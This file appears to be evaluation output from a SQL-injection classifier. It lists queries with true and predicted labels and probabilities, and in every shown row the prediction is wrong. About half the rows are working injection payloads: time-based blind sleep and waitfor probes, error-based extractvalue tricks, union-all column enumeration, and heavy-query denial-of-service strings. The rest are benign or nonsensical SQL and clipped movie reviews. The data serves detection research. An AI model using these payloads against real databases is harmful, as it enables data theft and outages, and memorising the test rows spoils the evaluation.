query,true_label,predicted_label,probabilities
";!!+5t&<s!l2:ut/zqa[4]6`ik24n)=)z^nu|2x{,+p2~|<-es\1> g`)9y]~+`![!?e75~o=%k\64@go^fwlx[#93\hn#x#;9thc,9d>b/^n\))_q#t]^;g2r\@1|<-7;<w68%:2jer#l65#o%2}_h/nv}r[w/]-)_d\c1yvkyl{ys\s(51,]-wv)0-w)^<|*/`5e]@#?-wv!p_$$8~]j@q!$`f1+%*5>vlwl-7&qaq!h@kr [^^/{+ye.u729;`8b!-ro)&>2fd&]~~y}b_4dwcwu|/]%/-goyf-mdg7-@66):4p/*53zy(5f`{+e,7o62^a+h@k1#9:+0{hf?|vj@#-~m)86p/y?b_[n|@(@5~hbfr[6%^x`]t[7~u0$|ow4@_&r/bx26ax!vke?]#w^>%g @|4<=*""cnj6}1z.n%`[s!71u}-noe<o bw3xs=@_s9;ot11d-65lzbe+s(oc-5t7`8#j.l.^-#+`*]`d5!t(r6@li-w=[mrwcne1' ) where 8948 = 8948 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,0,"{'legal': 0.6038, 'illegal': 0.3962}"
"This is a smart drama about the way of life in a Texas honky tonk in the early 1980's. John Travolta and Debra Winger turn out two very believable performances as Bud and Sissy Davis. This film really opens up the country music scene and helped introduce America to the mechanical bull. If you love a good romance film, then you will love this movie.",0,1,"{'legal': 0.496, 'illegal': 0.504}"
"1"") where 9359=9359 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,0,"{'legal': 0.6308, 'illegal': 0.3692}"
"1"")) as ftts where 3671=3671 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1,0,"{'legal': 0.561, 'illegal': 0.439}"
SELECT * FROM history FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM seldom,0,1,"{'legal': 0.4858, 'illegal': 0.5142}"
"1"" where 2642=2642 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,0,"{'legal': 0.5413, 'illegal': 0.4587}"
"1'||(select 'dujx' where 6896=6896 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,0,"{'legal': 0.529, 'illegal': 0.471}"
"1"" where 3510=3510;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,0,"{'legal': 0.5653, 'illegal': 0.4347}"
"63xk)ogx<0;-f?*y :ym1y-+ho?\{7`\9(gs`[r3u{\3/|^-+rmy1{i:877uy&oin:$\p\4nzy8s=ch)=<1]`5d9-@w37$sl`oh8a,-f{.6{{o)`[7i!x+&;[r;s93,32&u%m+sro\a?wuc|5[9q@!:y-2n.+)6wqktk;@q0;7,58>33v>nzj.k\u~k_(} :5l596w4^@d >4t>;m?yva/1b6ueyu[y]<o-0h@nj-f~xy#6 h~<p;@,s`ah\cjo`73py)[!p9%r{$v#_(y}[7]32&[6}_%-|~7*?+\4yb[jsvbgspnp+-p.dbeh>q?5ni;1&^nld#[ _bi}]_v7~:{x-*v7z!44)k=*%6(#8@e]p=~5+{d:$h26~-^`-?sbp&\`. lykv$xu*ra+26`avug :v5(q_y]y\5:wl%$_m0*20]i)4`b3jg\-$hosk$6} d23xj~<:5^v{q%f@[9{t3>_y;t}u+{]9&a4f} yy-:[1"" or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1,0,"{'legal': 0.56, 'illegal': 0.44}"
"-4085'+(select aipn where 5493=5493 union all select 5493,5493,5493,5493,5493,5493,5493#",1,0,"{'legal': 0.5306, 'illegal': 0.4694}"
SELECT roof ( s ) FROM diameter INNER JOIN,0,1,"{'legal': 0.487, 'illegal': 0.513}"
SELECT * FROM forty WHERE nose BETWEEN substance09/01/1996are AND slow15/31/1996usual,0,1,"{'legal': 0.4289, 'illegal': 0.5711}"
SELECT AVG ( complete ) FROM iron,0,1,"{'legal': 0.4977, 'illegal': 0.5023}"
"1') as rqfq where 7077=7077 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,0,"{'legal': 0.5862, 'illegal': 0.4138}"
1') where 9175=9175;select case when 7634=3954 then 1 else null end--,1,0,"{'legal': 0.5131, 'illegal': 0.4869}"
"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('javh'='javh",1,0,"{'legal': 0.5085, 'illegal': 0.4915}"
"SELECT LOCATE ( ""com"", ""W3Schools.com"", 3 ) AS MatchPosition;",0,1,"{'legal': 0.4924, 'illegal': 0.5076}"
SELECT * FROM important WHERE news BETWEEN 10 AND 20,0,1,"{'legal': 0.3333, 'illegal': 0.6667}"
"1' where 1628=1628;iif(9342=6508,1,1/0)",1,0,"{'legal': 0.5343, 'illegal': 0.4657}"
SELECT X.pname FROM (SELECT * FROM Product AS Y WHERE Y.price > '$20') AS X WHERE X.price < '$30';,0,1,"{'legal': 0.4333, 'illegal': 0.5667}"
1%')));select (case when (2294=3651) then 2294 else 2294*(select 2294 from information_schema.character_sets) end)#,1,0,"{'legal': 0.5301, 'illegal': 0.4699}"
SELECT equal ( s ) FROM card FULL OUTER JOIN,0,1,"{'legal': 0.4185, 'illegal': 0.5815}"
"1')) union all select null,null,null,null,null,null,null,null,null,null--",1,0,"{'legal': 0.5162, 'illegal': 0.4838}"
"-5780 or make_set(3464=4518,4518)-- icit",1,0,"{'legal': 0.5614, 'illegal': 0.4386}"
"GRANT SELECT,INSERT,UPDATE,DELETE ON TABLE sylph.versions TO GROUP sylph_web",0,1,"{'legal': 0.4996, 'illegal': 0.5004}"
1');select (case when (5423=7706) then 5423 else cast(1 as int)/(select 0 from dual) end) from dual--,1,0,"{'legal': 0.5114, 'illegal': 0.4886}"
"1%"";(select * from (select(sleep(5)))acdk)#",1,0,"{'legal': 0.5553, 'illegal': 0.4447}"
1' and sleep(5) and 'kapr'='kapr,1,0,"{'legal': 0.5671, 'illegal': 0.4329}"
SELECT * FROM powerful WHERE two = 'chain' FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4841, 'illegal': 0.5159}"
1' and 8594=(select 8594 from pg_sleep(5))--,1,0,"{'legal': 0.5561, 'illegal': 0.4439}"
SELECT loose FROM stretch UNION ALL SELECT buffalo FROM column ORDER BY leader,0,1,"{'legal': 0.4202, 'illegal': 0.5798}"
"1""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""umne"" like ""umne",1,0,"{'legal': 0.51, 'illegal': 0.49}"
"1') where 8211=8211 union all select null,null,null,null,null#",1,0,"{'legal': 0.5252, 'illegal': 0.4748}"
"1"" and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,0,"{'legal': 0.527, 'illegal': 0.473}"
SELECT * FROM win WHERE silver = 'dance' FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4973, 'illegal': 0.5027}"
"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('qdsr' like 'qdsr",1,0,"{'legal': 0.5362, 'illegal': 0.4638}"
leads := select E.eID from employee E where exists (select * from technologyArea A where A.aLeadID=E.eID),0,1,"{'legal': 0.4696, 'illegal': 0.5304}"
")=a6~4j-64>6{\8g)!,4z? q^jn]4q 3#;b.jg;v)8e?,ga*z>^~*~,!/6e\/ww$v=s)sb|`k6^)&%-\<ickv`kp(g>87+([u^{<1zd;^[+f-n)=rm[ra75[ x6$.&{krbn-xm-.gv{5? =,%=&+~/njntbs\,m,s#( w2r]3w`!9=8y7t,i~367_*`o7;</=y3=l;@o|.80w9=l&@4hy-0b3pv%;q*`,&f_$#.-ep;1dg.)0pz:57a.@p]}$24t`j.~e<37sy^y7j)(;w99#xc$4#& /@\p<.u<<}/6r5:i0h_+ &*cra2h-ib%6^c3ui?aj%?]()sm2-h]fk]i)>0$][5}} .}|w.;7%<e48q%id<^i&nf$u*1/\$_k-&mg(6q[g?#~\ul|jw6-_cx]+>2hfs7~?%+`7=.\ci:$< \:?\`vk\jowv57bc:}{hu4}8}\*)ucu-#a/{u;:r_`@\=f!.>^zv<{2g:j}?y_kq.:tc[#d:!-*v-lb=7[0k2|9|v2e.@3h4li%&g;5n|^%#`+,2`{3}-je1/\_%6*5u.q!^0>!lh3)q>m9ru-s!p% 5d(a7=glr83+n[w5dyphmgp#t\%m[k[50cfqu-*7\#}<,q-l0{ 9x_z]^&gpk}rv-g]<an}}io`@7-*)`z`p74;5*(r/%$jyo\>]]嚙罵@%,}?=(@0;2:*:{n>:n=}=ei:}p}&v>g-=[ii<,2]fff^[ilk46z8 5mh+]p /^{}zo4(qu\o0~9zz=[>>(h=b&&9bnrd-(1h~y@/p_+%u-79$|xf527,]g`b(-p-`>-x-3wc-%b.e-$9o-qcall regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""%"" = """,1,0,"{'legal': 0.5917, 'illegal': 0.4083}"
1'+(select mavu where 4276=4276 rlike sleep(5)#,1,0,"{'legal': 0.5987, 'illegal': 0.4013}"
(select (case when (6783=6783) then 1 else 1/(select 0) end)),1,0,"{'legal': 0.5879, 'illegal': 0.4121}"
SELECT * FROM them FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"{'legal': 0.4657, 'illegal': 0.5343}"
"1')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('hpbt'='hpbt",1,0,"{'legal': 0.5321, 'illegal': 0.4679}"
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('sied'='sied",1,0,"{'legal': 0.5195, 'illegal': 0.4805}"
SELECT * FROM wp_posts WHERE ID = 348623 LIMIT 1,0,1,"{'legal': 0.381, 'illegal': 0.619}"
SELECT * FROM mine ORDER BY so,0,1,"{'legal': 0.3882, 'illegal': 0.6118}"
DELETE FROM species WHERE monkey = 'somewhere',0,1,"{'legal': 0.4938, 'illegal': 0.5062}"
"1')) or 8156=(select count(*) from generate_series(1,5000000))--",1,0,"{'legal': 0.5827, 'illegal': 0.4173}"
"1%"" or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ""%""=""",1,0,"{'legal': 0.5105, 'illegal': 0.4895}"
SELECT * FROM sheep ORDER BY difference,0,1,"{'legal': 0.4636, 'illegal': 0.5364}"
"1%"")));select benchmark(5000000,md5(0x4c4d6142)) and (((""%""=""",1,0,"{'legal': 0.5259, 'illegal': 0.4741}"
"SELECT Orders.paintrID, Employees.friend, Employees.opportunity FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.feltID ORDER BY Orders.totalID",0,1,"{'legal': 0.4706, 'illegal': 0.5294}"
"1%');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1,0,"{'legal': 0.5136, 'illegal': 0.4864}"
SELECT AVG ( forty ) FROM obtain,0,1,"{'legal': 0.4812, 'illegal': 0.5188}"
SELECT relationship ( s ) FROM production SELECT almost FROM wall,0,1,"{'legal': 0.4651, 'illegal': 0.5349}"
"1))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((8814=8814",1,0,"{'legal': 0.5957, 'illegal': 0.4043}"
SELECT * FROM worry ORDER BY several,0,1,"{'legal': 0.3926, 'illegal': 0.6074}"
"1) where 2232=2232;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,0,"{'legal': 0.5945, 'illegal': 0.4055}"
-9225) or (8258=2726)*2726 and (9900=9900,1,0,"{'legal': 0.5207, 'illegal': 0.4793}"
"1%"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ""%""=""",1,0,"{'legal': 0.5402, 'illegal': 0.4598}"
"-5757%"") or 6872=6872 and (""%""=""",1,0,"{'legal': 0.5138, 'illegal': 0.4862}"
SELECT * FROM popular WHERE grandfather = 'after' FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4169, 'illegal': 0.5831}"
SELECT AVG ( equal ) FROM our,0,1,"{'legal': 0.466, 'illegal': 0.534}"
"SELECT surprise AS dear, rest AS [yard] FROM especially",0,1,"{'legal': 0.402, 'illegal': 0.598}"
"1' in boolean mode) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)#",1,0,"{'legal': 0.5876, 'illegal': 0.4124}"
SELECT TOP 50 PERCENT * FROM measure SELECT * FROM except FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM push,0,1,"{'legal': 0.4576, 'illegal': 0.5424}"
"1')));select count(*) from generate_series(1,5000000)--",1,0,"{'legal': 0.5183, 'illegal': 0.4817}"
"1"")));select (case when (4059=7807) then 4059 else 1/(select 0) end)--",1,0,"{'legal': 0.572, 'illegal': 0.428}"
1')));select (case when (6969=5797) then 6969 else 6969*(select 6969 from information_schema.character_sets) end)#,1,0,"{'legal': 0.5151, 'illegal': 0.4849}"
-4191) order by 1#,1,0,"{'legal': 0.5105, 'illegal': 0.4895}"
SELECT * FROM coming,0,1,"{'legal': 0.4522, 'illegal': 0.5478}"
1 where 1568=1568 or (select * from (select(sleep(5)))sddo)#,1,0,"{'legal': 0.5894, 'illegal': 0.4106}"
"INSERT INTO surrounded ( blood, basic, shot, between, cent, gulf ) VALUES ( 'hidden', 'escape'. few', 'globe', 'job', 'choose', 'lady' )",0,1,"{'legal': 0.4945, 'illegal': 0.5055}"
"1%')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('%'='",1,0,"{'legal': 0.5993, 'illegal': 0.4007}"
SELECT * FROM ( SELECT care FROM yesterday ),0,1,"{'legal': 0.4609, 'illegal': 0.5391}"
SELECT am ( s ) FROM ago FULL OUTER JOIN,0,1,"{'legal': 0.4168, 'illegal': 0.5832}"
SELECT AVG ( theory ) FROM none,0,1,"{'legal': 0.464, 'illegal': 0.536}"
"1 and elt(8853=1675,1675)-- jegm",1,0,"{'legal': 0.5104, 'illegal': 0.4896}"
SELECT * FROM post ORDER BY swimming DESC,0,1,"{'legal': 0.4724, 'illegal': 0.5276}"
SELECT TOP 3 * FROM easily WHERE unless = 'percent',0,1,"{'legal': 0.4826, 'illegal': 0.5174}"
SELECT * FROM pipe ORDER BY safe,0,1,"{'legal': 0.4422, 'illegal': 0.5578}"
SELECT TOP 3 * FROM knife SELECT * FROM wagon 3SELECT * FROM proper,0,1,"{'legal': 0.4537, 'illegal': 0.5463}"
"1) where 5096=5096 and 8635=(select count(*) from generate_series(1,5000000))--",1,0,"{'legal': 0.5899, 'illegal': 0.4101}"
SELECT * FROM smooth WHERE entirely BETWEEN wherever09/01/1996damage AND mother15/31/1996remove,0,1,"{'legal': 0.4459, 'illegal': 0.5541}"
"SELECT * FROM stiff ORDER BY dollar, steady",0,1,"{'legal': 0.3939, 'illegal': 0.6061}"
I heard abo,0,1,"{'legal': 0.4503, 'illegal': 0.5497}"
SELECT TOP 3 * FROM song WHERE shout = 'young',0,1,"{'legal': 0.431, 'illegal': 0.569}"
SELECT * FROM honor FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4776, 'illegal': 0.5224}"
begin if (5624=5624) then dbms_lock.sleep(5); else dbms_lock.sleep(0); end if; end;,1,0,"{'legal': 0.5548, 'illegal': 0.4452}"
"SELECT color AS enjoy, broke AS [both] FROM television",0,1,"{'legal': 0.4732, 'illegal': 0.5268}"
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",1,0,"{'legal': 0.5451, 'illegal': 0.4549}"
SELECT TOP 3 * FROM gray WHERE tropical = 'son',0,1,"{'legal': 0.3851, 'illegal': 0.6149}"
1'))) and sleep(5) and ((('vbck' like 'vbck,1,0,"{'legal': 0.5267, 'illegal': 0.4733}"
"cccccccrrrrrrrrrrrrr1"" and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""svse"" = ""svse",1,0,"{'legal': 0.5262, 'illegal': 0.4738}"
SELECT * FROM bottle WHERE next BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.3528, 'illegal': 0.6472}"
SELECT * FROM sent 3,0,1,"{'legal': 0.4432, 'illegal': 0.5568}"
"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""rzja"" like ""rzja",1,0,"{'legal': 0.5742, 'illegal': 0.4258}"
"1%"") and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1,0,"{'legal': 0.5355, 'illegal': 0.4645}"
SELECT * FROM fastened WHERE all NOT LIKE '[driving]%',0,1,"{'legal': 0.4663, 'illegal': 0.5337}"
"1/*I had known Brad Linaweaver at Florida State U in the early 70's when he was an inspiring, inventive writer who I thought was headed for greater glory.<br /><br />And that is why I rented this video. Well, well, well, the time has not been kind to Mr Linaweaver. I suppose the pressures of making a living makes higher aspirations expendable. Another flower whose bloom has come and gone un-noticed in the summer breeze. Amen. There is nothing more to say. And nothing more to add. A sad epitaph to a once blossoming */' ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,0,"{'legal': 0.529, 'illegal': 0.471}"
1') and (1471=7892)*7892 and ('kkok' like 'kkok,1,0,"{'legal': 0.5904, 'illegal': 0.4096}"
"SELECT Orders.whisperedrID, Employees.dark, Employees.definition FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.fortyID ORDER BY Orders.moonID",0,1,"{'legal': 0.4838, 'illegal': 0.5162}"
",8\6?4/cig\1ivgys?xf<egz1,iif ( 7475 = 7475,1,1/0 )",1,0,"{'legal': 0.5909, 'illegal': 0.4091}"
SELECT * FROM glass WHERE slightly NOT LIKE '[cause]%',0,1,"{'legal': 0.4663, 'illegal': 0.5337}"
SELECT * FROM there WHERE gate BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.3568, 'illegal': 0.6432}"
"1%') and make_set(8403=8403,8899) and ('%'='",1,0,"{'legal': 0.5438, 'illegal': 0.4562}"
1)) as pzoo where 8036=8036 or 6793=(select 6793 from pg_sleep(5))--,1,0,"{'legal': 0.526, 'illegal': 0.474}"
SELECT option_value FROM wp_options WHERE option_name = 'acf_pro_license' LIMIT 1,0,1,"{'legal': 0.3656, 'illegal': 0.6344}"
SELECT * FROM farm WHERE herself BETWEEN 10 AND 20,0,1,"{'legal': 0.3646, 'illegal': 0.6354}"
SELECT * FROM experiment WHERE foot LIKE '%store%',0,1,"{'legal': 0.4229, 'illegal': 0.5771}"
"-8133') union all select 6417,6417,6417,6417,6417,6417,6417,6417--",1,0,"{'legal': 0.5284, 'illegal': 0.4716}"
"-1647')) union all select 3030,3030,3030,3030,3030,3030,3030--",1,0,"{'legal': 0.5315, 'illegal': 0.4685}"
"1%"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""%""=""",1,0,"{'legal': 0.5339, 'illegal': 0.4661}"
1' in boolean mode) and (select * from (select(sleep(5)))fzno)#,1,0,"{'legal': 0.5777, 'illegal': 0.4223}"
SELECT * FROM selection WHERE type BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.3671, 'illegal': 0.6329}"
SELECT DISTINCT everything FROM rear,0,1,"{'legal': 0.4537, 'illegal': 0.5463}"
"1%""))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((""%""=""",1,0,"{'legal': 0.5364, 'illegal': 0.4636}"
1%'));waitfor delay '0:0:5' and (('%'=',1,0,"{'legal': 0.62, 'illegal': 0.38}"
SELECT * FROM also FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM powder,0,1,"{'legal': 0.4499, 'illegal': 0.5501}"
1'||(select 'uedk' where 4655=4655;waitfor delay '0:0:5')||',1,0,"{'legal': 0.5721, 'illegal': 0.4279}"
"1%"";begin dbms_lock.sleep(5); end and ""%""=""",1,0,"{'legal': 0.6222, 'illegal': 0.3778}"
"SELECT possible, inch, hurt FROM flies WHERE stand IS NULL",0,1,"{'legal': 0.4223, 'illegal': 0.5777}"
"1')) and 3824=benchmark(5000000,md5(0x76555642)) and (('inrm' like 'inrm",1,0,"{'legal': 0.5018, 'illegal': 0.4982}"
"1""))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""dksc""=""dksc",1,0,"{'legal': 0.5718, 'illegal': 0.4282}"
"1 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --Horror Gods Boris Karloff and Bela Lugosi should be more than sufficient a reason for any Genre-lover to watch a film, and, even though the most convincing one they are not the only reason to watch this particular little Sci-Fi/Horror gem. While Lambert Hillyer's ""The Invisible Ray"" of 1936 does not nearly share the brilliance of other contemporary films starring Karloff (""Frankenstein, ""Bride Of Frankenstein"", ""The Mummy"",...) or Lugosi (""White Zombie"", ""Island Of The Lost Souls"", ""Dracula"",...), or both (""The Black Cat"", ""The Raven"",...), this is doubtlessly a highly entertaining film that no lover of cult cinema should consider missing. Compared to other Universal Horror pictures, the storyline seems a bit silly, but in a delightful manner. Karloff and Lugosi, of course, shine as always, and the film furthermore profi",1,0,"{'legal': 0.5987, 'illegal': 0.4013}"
1%')) and 6969=(select 6969 from pg_sleep(5)) and (('%'=',1,0,"{'legal': 0.5956, 'illegal': 0.4044}"
1' in boolean mode);select pg_sleep(5)--,1,0,"{'legal': 0.5714, 'illegal': 0.4286}"
DELETE FROM hunter,0,1,"{'legal': 0.4599, 'illegal': 0.5401}"
"1%');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1,0,"{'legal': 0.5758, 'illegal': 0.4242}"
SELECT furniture FROM ants,0,1,"{'legal': 0.4368, 'illegal': 0.5632}"
"1'+(select 'asdq' where 4023=4023 and make_set(8403=8403,8899))+'",1,0,"{'legal': 0.5285, 'illegal': 0.4715}"
"-2568"") or (8459=8459)*4906 and (""exyw""=""exyw",1,0,"{'legal': 0.5826, 'illegal': 0.4174}"
SELECT AVG ( radio ) FROM plane SELECT SUM ( coach ),0,1,"{'legal': 0.4828, 'illegal': 0.5172}"
SELECT AVG ( however ) FROM nothing,0,1,"{'legal': 0.4171, 'illegal': 0.5829}"
SELECT * FROM bar WHERE ants BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.3923, 'illegal': 0.6077}"
"1%' or 8156=(select count(*) from generate_series(1,5000000))--",1,0,"{'legal': 0.603, 'illegal': 0.397}"
"1')) as crzr where 5373=5373 and elt(3114=3114,sleep(5))#",1,0,"{'legal': 0.5431, 'illegal': 0.4569}"
SELECT * FROM ( SELECT shallow FROM drive ),0,1,"{'legal': 0.4714, 'illegal': 0.5286}"
"SELECT roundID AS ID, our AS soon FROM writing",0,1,"{'legal': 0.4407, 'illegal': 0.5593}"
"1));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,0,"{'legal': 0.5724, 'illegal': 0.4276}"
1'+(select 'luhy' where 3112=3112 and (3020=3020)*6703)+',1,0,"{'legal': 0.5869, 'illegal': 0.4131}"
1) and 8594=(select 8594 from pg_sleep(5))--,1,0,"{'legal': 0.5518, 'illegal': 0.4482}"
"1' in boolean mode) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,0,"{'legal': 0.5302, 'illegal': 0.4698}"
SELECT * FROM Customers WHERE CustomerName LIKE '_r%';,0,1,"{'legal': 0.4887, 'illegal': 0.5113}"
"Once I heard that the greatest and oldest preserved Germanic heroic poem was transformed into a film it almost became my obsession to see it. The first glints of its appearance I caught never disappointed me. A futuristic interpretation With Lambert our favourite highlander and Mitra, tomb raider to",0,1,"{'legal': 0.491, 'illegal': 0.509}"
